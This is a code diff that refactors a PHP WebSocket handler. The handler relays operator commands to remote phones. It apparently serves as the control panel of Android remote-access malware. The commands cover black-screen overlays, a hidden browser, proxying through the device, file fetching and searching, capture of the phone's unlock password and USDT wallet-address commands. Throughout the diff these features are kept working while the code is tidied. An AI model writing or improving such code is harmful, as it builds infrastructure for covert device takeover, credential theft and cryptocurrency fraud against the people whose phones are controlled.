@@ -5,76 +5,56 @@ declare(strict_types=1);
 namespace App\WebSocket\Handlers;
 
 use App\WebSocket\ConnectionManager;
+use App\WebSocket\Handlers\Concerns\AuthorizesDeviceAccess;
+use App\WebSocket\Messages\WebSocketMessage;
 use App\WebSocket\Services\DeviceStatusService;
 use App\WebSocket\Services\LastPingFormatter;
 use App\WebSocket\WebSocketLog;
 
 final class PanelHandler
 {
+    use AuthorizesDeviceAccess;
+
     public function __construct(
         private readonly ConnectionManager $connectionManager,
         private readonly DeviceStatusService $deviceStatusService
     ) {}
 
-    public function handle(int $fd, array $data): void
+    public function handle(int $fd, WebSocketMessage $message): void
     {
-        $phoneId = $data['pid'] ?? null;
-        $subc = $data['subc'] ?? null;
-
+        $phoneId = $this->authorizeDeviceAccess($fd, $message, $this->connectionManager);
         if ($phoneId === null) {
-            WebSocketLog::getLogger()->warning("Panel message missing pid: fd={$fd}");
-
             return;
         }
 
-        if (! $this->connectionManager->isPanelAuthorizedForDevice($fd, $phoneId)) {
-            WebSocketLog::getLogger()->warning("Panel unauthorized for device: fd={$fd}, pid={$phoneId}");
-            $this->connectionManager->send($fd, [
-                'type' => 'error',
-                'error' => 'Not authorized for this device',
-                'pid' => $phoneId,
-            ]);
-
-            return;
-        }
+        $subc = $message->subc();
 
         match ($subc) {
-            'join' => $this->handleJoin($fd, $phoneId, $data),
-            'out' => $this->handleOut($phoneId, $data),
+            'join' => $this->handleJoin($fd, $phoneId),
+            'out' => $this->handleOut($phoneId),
             'ping' => $this->handlePing($fd, $phoneId),
             'disag' => $this->handleDisag($phoneId),
-            'screen' => $this->handleScreenCommand($phoneId, $data),
-            'brows' => $this->handleBrowserCommand($phoneId, $data),
-            'proxy' => $this->handleProxyCommand($phoneId, $data),
-            'fetch' => $this->handleFetchCommand($phoneId, $data),
-            'bc' => $this->handleBroadcastCommand($phoneId, $data),
-            'srch' => $this->handleSearchCommand($phoneId, $data),
-            'cocu' => $this->handleCopyCommand($phoneId, $data),
-            'chat' => $this->handleChatCommand($phoneId, $data),
-            default => $this->forwardToDevice($phoneId, $data),
+            'screen' => $this->handleScreenCommand($phoneId, $message),
+            'brows' => $this->handleBrowserCommand($phoneId, $message),
+            'proxy' => $this->handleProxyCommand($phoneId, $message),
+            'fetch' => $this->handleFetchCommand($phoneId, $message),
+            'bc' => $this->handleBroadcastCommand($phoneId, $message),
+            'srch' => $this->handleSearchCommand($phoneId, $message),
+            'cocu' => $this->handleCopyCommand($phoneId, $message),
+            'chat' => $this->handleChatCommand($phoneId, $message),
+            default => $this->forwardToDevice($phoneId, $message),
         };
     }
 
-    private function handleJoin(int $fd, string $phoneId, array $data): void
+    private function handleJoin(int $fd, string $phoneId): void
     {
         $this->connectionManager->registerPanel($fd, $phoneId);
-
         $this->logOperation('mov_connect', $phoneId);
 
-        $isOnline = $this->connectionManager->isDeviceOnline($phoneId);
-        $phoneInfo = $this->deviceStatusService->formatForPanel($phoneId);
-        $lastPing = LastPingFormatter::format($phoneInfo['lastPing'] ?? null);
-
-        $this->connectionManager->send($fd, [
-            'type' => 'statusBatch',
-            'pid' => $phoneId,
-            'serverToPhone' => $isOnline ? 'OPEN' : 'CLOSED',
-            'lastPing' => $lastPing,
-            'phoneInfo' => $phoneInfo,
-        ]);
+        $this->connectionManager->send($fd, $this->buildStatusBatchPayload($phoneId));
     }
 
-    private function handleOut(string $phoneId, array $data): void
+    private function handleOut(string $phoneId): void
     {
         $this->connectionManager->sendToDevice($phoneId, [
             'type' => 'screencomd',
@@ -84,18 +64,22 @@ final class PanelHandler
 
     private function handlePing(int $fd, string $phoneId): void
     {
+        $this->connectionManager->send($fd, $this->buildStatusBatchPayload($phoneId));
+    }
+
+    private function buildStatusBatchPayload(string $phoneId): array
+    {
         $phoneInfo = $this->deviceStatusService->formatForPanel($phoneId);
         $isOnline = $this->connectionManager->isDeviceOnline($phoneId);
-        $serverToPhone = $isOnline ? 'OPEN' : 'CLOSED';
         $lastPing = LastPingFormatter::format($phoneInfo['lastPing'] ?? null);
 
-        $this->connectionManager->send($fd, [
+        return [
             'type' => 'statusBatch',
             'pid' => $phoneId,
-            'serverToPhone' => $serverToPhone,
+            'serverToPhone' => $this->connectionStatusLabel($isOnline),
             'lastPing' => $lastPing,
             'phoneInfo' => $phoneInfo,
-        ]);
+        ];
     }
 
     private function handleDisag(string $phoneId): void
@@ -107,78 +91,78 @@ final class PanelHandler
         }
     }
 
-    private function handleScreenCommand(string $phoneId, array $data): void
+    private function handleScreenCommand(string $phoneId, WebSocketMessage $message): void
     {
-        $command = $data['comand'] ?? '';
+        $command = $message->getString('comand');
 
         $deviceData = match ($command) {
             'block' => [
                 'type' => 'screen',
                 'subc' => 'block',
-                'blockstate' => $data['bstate'] ?? '0',
-                'color' => $data['color'] ?? '',
+                'blockstate' => $message->getString('bstate', '0'),
+                'color' => $message->getString('color'),
             ],
             'paste' => [
                 'type' => 'screen',
                 'subc' => 'paste',
-                'txt' => $data['txt'] ?? '',
+                'txt' => $message->getString('txt'),
             ],
             'mov' => [
                 'type' => 'screen',
                 'subc' => 'mov',
-                'poi' => $data['poi'] ?? '',
-                'movetype' => $data['movetype'] ?? '',
+                'poi' => $message->getString('poi'),
+                'movetype' => $message->getString('movetype'),
             ],
             'snap' => [
                 'type' => 'screen',
                 'subc' => 'snap',
-                'snaptype' => $data['stype'] ?? '1',
+                'snaptype' => $message->getString('stype', '1'),
             ],
             'vol' => [
                 'type' => 'screen',
                 'subc' => 'vol',
-                'volstate' => $data['volstate'] ?? '0',
+                'volstate' => $message->getString('volstate', '0'),
             ],
             'kb' => [
                 'type' => 'screen',
                 'subc' => 'kb',
-                'kbstate' => $data['kbstate'] ?? '0',
+                'kbstate' => $message->getString('kbstate', '0'),
             ],
             'L' => [
                 'type' => 'screen',
                 'subc' => 'L',
-                'lock' => $data['lockit'] ?? '0',
+                'lock' => $message->getString('lockit', '0'),
             ],
             'nav' => [
                 'type' => 'screen',
                 'subc' => 'nav',
-                'nav' => $data['navshort'] ?? '',
+                'nav' => $message->getString('navshort'),
             ],
             'q' => [
                 'type' => 'screen',
                 'subc' => 'Q',
-                'newq' => $data['newqulity'] ?? '',
+                'newq' => $message->getString('newqulity'),
             ],
             'phonepass' => [
                 'type' => 'screen',
                 'subc' => 'phonepass',
-                'passtype' => $data['passtype'] ?? '',
-                'phonepass' => $data['txt'] ?? '',
+                'passtype' => $message->getString('passtype'),
+                'phonepass' => $message->getString('txt'),
             ],
             'usdt' => [
                 'type' => 'screen',
                 'subc' => 'usdt',
-                'usdttype' => $data['usdttype'] ?? '',
+                'usdttype' => $message->getString('usdttype'),
             ],
             'usdtadress' => [
                 'type' => 'screen',
                 'subc' => 'usdtadress',
-                'usdtadresstext' => $data['usdtadresstext'] ?? '',
+                'usdtadresstext' => $message->getString('usdtadresstext'),
             ],
             'blockd' => [
                 'type' => 'screen',
                 'subc' => 'blockd',
-                'blocktext' => $data['blocktext'] ?? '',
+                'blocktext' => $message->getString('blocktext'),
             ],
             default => [
                 'type' => 'screen',
@@ -189,23 +173,23 @@ final class PanelHandler
         $this->connectionManager->sendToDevice($phoneId, $deviceData);
     }
 
-    private function handleBrowserCommand(string $phoneId, array $data): void
+    private function handleBrowserCommand(string $phoneId, WebSocketMessage $message): void
     {
-        $btype = $data['btype'] ?? 'n';
+        $btype = $message->getString('btype', 'n');
 
         // Node.js: h=hidden browser, n=normal browser - different field structures
         $deviceData = match ($btype) {
             'h' => [
                 'type' => 'brows',
                 'subc' => 'h',
-                'bcom' => $data['bcom'] ?? '',      // 0=stop, 1=start, 3=command
-                'extdata' => $data['extdata'] ?? null,
+                'bcom' => $message->getString('bcom'),      // 0=stop, 1=start, 3=command
+                'extdata' => $message->get('extdata'),
             ],
             'n' => [
                 'type' => 'brows',
                 'subc' => 'n',
-                'ltype' => $data['ltype'] ?? '',    // f=html base64, u=url
-                'extdata' => $data['extdata'] ?? null,
+                'ltype' => $message->getString('ltype'),    // f=html base64, u=url
+                'extdata' => $message->get('extdata'),
             ],
             default => null,
         };
@@ -215,9 +199,9 @@ final class PanelHandler
         }
     }
 
-    private function handleProxyCommand(string $phoneId, array $data): void
+    private function handleProxyCommand(string $phoneId, WebSocketMessage $message): void
     {
-        $prxcom = $data['prxcom'] ?? '';
+        $prxcom = $message->getString('prxcom');
 
         // Convert ON/OFF to 1/0 as per Node.js protocol
         $subc = match ($prxcom) {
@@ -236,20 +220,20 @@ final class PanelHandler
         ]);
     }
 
-    private function handleFetchCommand(string $phoneId, array $data): void
+    private function handleFetchCommand(string $phoneId, WebSocketMessage $message): void
     {
         $this->connectionManager->sendToDevice($phoneId, [
             'type' => 'screencomd',
             'subc' => 'fetch',
-            'ftype' => $data['ftype'] ?? '',
-            'fpath' => $data['fpath'] ?? '',
+            'ftype' => $message->getString('ftype'),
+            'fpath' => $message->getString('fpath'),
         ]);
     }
 
-    private function handleBroadcastCommand(string $phoneId, array $data): void
+    private function handleBroadcastCommand(string $phoneId, WebSocketMessage $message): void
     {
-        $command = $data['comand'] ?? '';
-        $action = $data['act'] ?? '';
+        $command = $message->getString('comand');
+        $action = $message->getString('act');
 
         // Map action string to number as per Node.js protocol
         $actionNum = match ($action) {
@@ -265,16 +249,16 @@ final class PanelHandler
 
         $baseData = [
             'type' => 'bc',
-            'thetitle' => $data['title'] ?? '',
-            'themsg' => $data['msg'] ?? '',
-            'toopen' => $data['todo'] ?? '',
+            'thetitle' => $message->getString('title'),
+            'themsg' => $message->getString('msg'),
+            'toopen' => $message->getString('todo'),
             'theype' => $actionNum,
         ];
 
         $deviceData = match ($command) {
             'alert' => array_merge($baseData, [
                 'subc' => 'A',
-                'ico' => $data['alertico'] ?? '',
+                'ico' => $message->getString('alertico'),
             ]),
             'notify' => array_merge($baseData, [
                 'subc' => 'N',
@@ -287,41 +271,46 @@ final class PanelHandler
         }
     }
 
-    private function handleSearchCommand(string $phoneId, array $data): void
+    private function handleSearchCommand(string $phoneId, WebSocketMessage $message): void
     {
         $this->connectionManager->sendToDevice($phoneId, [
             'type' => 'screencomd',
             'subc' => 'srch',
-            'srchfor' => $data['srchfor'] ?? '',
-            'srchin' => $data['srchin'] ?? '',
-            'targetpath' => $data['targetpath'] ?? '',
+            'srchfor' => $message->getString('srchfor'),
+            'srchin' => $message->getString('srchin'),
+            'targetpath' => $message->getString('targetpath'),
         ]);
     }
 
-    private function handleCopyCommand(string $phoneId, array $data): void
+    private function handleCopyCommand(string $phoneId, WebSocketMessage $message): void
     {
         $this->connectionManager->sendToDevice($phoneId, [
             'type' => 'screencomd',
             'subc' => 'cocu',
-            'state' => $data['state'] ?? '',
-            'tp' => $data['tp'] ?? '',
-            'fp' => $data['fp'] ?? '',
+            'state' => $message->getString('state'),
+            'tp' => $message->getString('tp'),
+            'fp' => $message->getString('fp'),
         ]);
     }
 
-    private function handleChatCommand(string $phoneId, array $data): void
+    private function handleChatCommand(string $phoneId, WebSocketMessage $message): void
     {
         $this->connectionManager->sendToDevice($phoneId, [
             'type' => 'screencomd',
             'subc' => 'chat',
-            'msg' => $data['msg'] ?? '',
-            'title' => $data['title'] ?? '',
+            'msg' => $message->getString('msg'),
+            'title' => $message->getString('title'),
         ]);
     }
 
-    private function forwardToDevice(string $phoneId, array $data): void
+    private function connectionStatusLabel(bool $isOnline): string
     {
-        $deviceData = array_merge($data, ['type' => 'screencomd']);
+        return $isOnline ? 'OPEN' : 'CLOSED';
+    }
+
+    private function forwardToDevice(string $phoneId, WebSocketMessage $message): void
+    {
+        $deviceData = array_merge($message->toArray(), ['type' => 'screencomd']);
         unset($deviceData['itype'], $deviceData['pid']);
 
         $this->connectionManager->sendToDevice($phoneId, $deviceData);
